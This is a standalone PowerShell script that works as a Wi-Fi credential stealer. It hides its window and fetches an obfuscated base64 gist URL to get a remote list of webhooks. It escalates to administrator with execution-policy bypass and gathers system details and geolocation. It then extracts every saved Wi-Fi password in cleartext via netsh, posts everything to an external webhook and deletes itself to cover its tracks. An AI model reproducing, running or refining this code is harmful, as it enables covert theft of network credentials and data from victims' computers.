param([string]$WebhookURL,[string]$EncryptionPass,[switch]$Stealth)

$VerboseMode = -not $Stealth
function Write-Log { param([string]$Message); if ($VerboseMode) { Write-Host $Message } }

if ($Stealth) {
    try { Add-Type -Name W -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int s);' -Namespace N -ErrorAction Stop } catch {}
    $h = (Get-Process -Id $pid).MainWindowHandle
    if ($h -ne [IntPtr]::Zero) { try { [N.W]::ShowWindow($h, 0) } catch {} }
}

$gist = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9kcm54NjQvNWQ5NGFhNTliN2E0YjRiMWI0NjkwOTgyZGU0YjExYjMvcmF3L2U3YWU1Nzg5MzQ5YzZjMmEwNmRhMGU3NDBlN2I0YjY5N2VhZjk0MWEvd2gudHh0"
$ENC_PASS = if ($EncryptionPass) { $EncryptionPass } else { "sqd5-dcwh-default-key" }

if (-not $WebhookURL -and $env:DCWH_URL) { $WebhookURL = $env:DCWH_URL }

if (-not $WebhookURL) {
    try {
        $whResponse = Invoke-WebRequest ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($gist))) -UseBasicParsing -TimeoutSec 10
        $hooks = ($whResponse.Content -split "`r?`n") | Where-Object { $_ -match '^https?://' }
        if ($hooks) { $WebhookURL = ($hooks | Get-Random).Trim() }
    } catch {}
}

if (-not $WebhookURL -or $WebhookURL -notmatch '^https?://') { exit 1 }

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    $argList = [System.Collections.ArrayList]@("-NoP", "-EP", "Bypass")
    if ($Stealth) { $null = $argList.Add("-WindowStyle"); $null = $argList.Add("Hidden") }
    $null = $argList.Add("-File"); $null = $argList.Add("`"$PSCommandPath`"")
    if ($WebhookURL) { $null = $argList.Add("-WebhookURL"); $null = $argList.Add("`"$WebhookURL`"") }
    if ($EncryptionPass) { $null = $argList.Add("-EncryptionPass"); $null = $argList.Add("`"$EncryptionPass`"") }
    if ($Stealth) { $null = $argList.Add("-Stealth") }
    Start-Process -FilePath powershell -ArgumentList $argList -Verb RunAs
    exit 1
}

$computer = $env:COMPUTERNAME
$sys = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
$model = if ($sys -and $sys.Model) { $sys.Model.Trim() } else { "Unknown" }
$cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue).Name
$cores = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue).NumberOfCores
$os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
$osCaption = if ($os -and $os.Caption) { $os.Caption.Trim() } else { "Unknown" }

try {
    $geo = Invoke-RestMethod "http://ip-api.com/json/?fields=query,city,country,isp" -TimeoutSec 5
    $geoStr = "$($geo.city), $($geo.country) | $($geo.isp)"
} catch { $geoStr = "Unavailable" }

$profiles = netsh wlan show profiles 2>$null | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(':',2)[1].Trim() } | Sort-Object -Unique

$wifiEntries = @()
if ($profiles) {
    foreach ($p in $profiles) {
        $info = netsh wlan show profile name="$p" key=clear 2>$null
        $keyLine = ($info | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(':',2)[1].Trim() }) -join ''
        if ($keyLine) { $wifiEntries += [PSCustomObject]@{ SSID = $p; PASS = $keyLine } }
    }
}

$maxRetries = 3
function Send-Webhook { param($Body) Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Body -ContentType "application/json" -TimeoutSec 10 | Out-Null }

$sysBody = @{ content = "**$computer** | $model | $cpu`nOS: $osCaption`nGeo: $geoStr" } | ConvertTo-Json
for ($i = 1; $i -le $maxRetries; $i++) {
    try { Send-Webhook $sysBody; break } catch { if ($i -lt $maxRetries) { Start-Sleep 2 } }
}

if ($wifiEntries.Count -gt 0) {
    foreach ($w in $wifiEntries) {
        $body = @{ content = "SSID: $($w.SSID)`nPASS: $($w.PASS)" } | ConvertTo-Json
        for ($i = 1; $i -le $maxRetries; $i++) {
            try { Send-Webhook $body; break } catch { if ($i -lt $maxRetries) { Start-Sleep 1 } }
        }
        Start-Sleep 1
    }
} else {
    Send-Webhook (@{ content = "No saved credentials found on $computer." } | ConvertTo-Json)
}

$sp = $PSCommandPath -replace "'","''"
Start-Process powershell "-NoP -EP Bypass -WindowStyle Hidden -Command `"Start-Sleep 2; ri '$sp' -Fo`""
